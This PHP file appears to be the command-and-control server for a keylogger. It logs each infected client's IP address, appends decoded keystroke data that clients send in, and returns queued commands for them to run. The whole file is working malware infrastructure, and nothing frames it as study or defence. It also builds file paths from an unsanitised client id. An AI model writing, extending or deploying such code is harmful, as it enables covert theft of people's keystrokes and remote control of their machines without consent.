<?php

        ini_set('display_errors', 1);
        error_reporting(E_ALL);


        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                die();
        }

        $json = file_get_contents('php://input');
        $data = json_decode($json, true);

        if (!(isset($data['id']) || isset($data['type']))) {
                die();
        } 

        $type = $data['type'];
        $id = $data['id'];
        $logfile = "/var/log/keylog/log-$id.txt";


        if ($type === 'register' && !file_exists($logfile)) {
                file_put_contents($logfile, "ORIGIN:" . $_SERVER['REMOTE_ADDR'] . "\n");
        } else if ($type == 'checkin') {

                if (!file_exists($logfile)) {
                        die();
                }

                $str = urldecode(rawurldecode(base64_decode($data['data'])));
                file_put_contents($logfile, $str, FILE_APPEND);

                $command_file = "/var/log/keylog/commands-$id.txt";
                if (!file_exists($command_file)) {
                        header('Content-Type: application/json');
                        echo json_encode(array());
                        die();
                }

                $commands = array();

                $file = fopen($command_file, 'r');
                if ($file) {
                    while (($line = fgets($file)) !== false) {
                        $commands[] = trim($line);
                    }
                    fclose($file);
                } else {
                    die("Failed to open file: $filename");
                }

                $response = array('commands' => $commands);
                header('Content-Type: application/json');
                echo json_encode($response);
        }
?>
